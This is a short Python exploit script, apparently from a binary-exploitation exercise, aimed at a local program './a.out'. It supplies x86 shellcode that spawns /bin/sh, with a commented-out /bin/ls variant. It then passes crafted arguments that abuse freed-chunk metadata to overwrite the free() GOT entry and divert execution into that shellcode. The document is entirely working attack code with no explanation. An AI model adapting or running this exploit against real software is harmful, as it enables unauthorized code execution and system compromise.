# exploit.py
import sys
import struct
from subprocess import Popen

addr_box_buf = int(sys.argv[1], 16)

# execve("/bin/ls", {"/bin/ls", NULL}, NULL)
# shellcode = '\x31\xd2\x52\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'

# execve("/bin/sh", {"/bin/sh", NULL}, NULL)
shellcode = '\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'

addr_got_free = 0x804a010 # objdump -d -j.plt a.out

# first 8 bytes will be overwritten by fd, bk when freed
box_buf1 = 'BBBBBBBB' + shellcode

size_newbuf = 8
newbuf = 'AAAA'
newbuf += struct.pack('<I', addr_got_free)

box_buf2 = struct.pack('<I', addr_box_buf)

p = Popen(['./a.out', box_buf1, str(size_newbuf), newbuf, box_buf2])
p.wait()
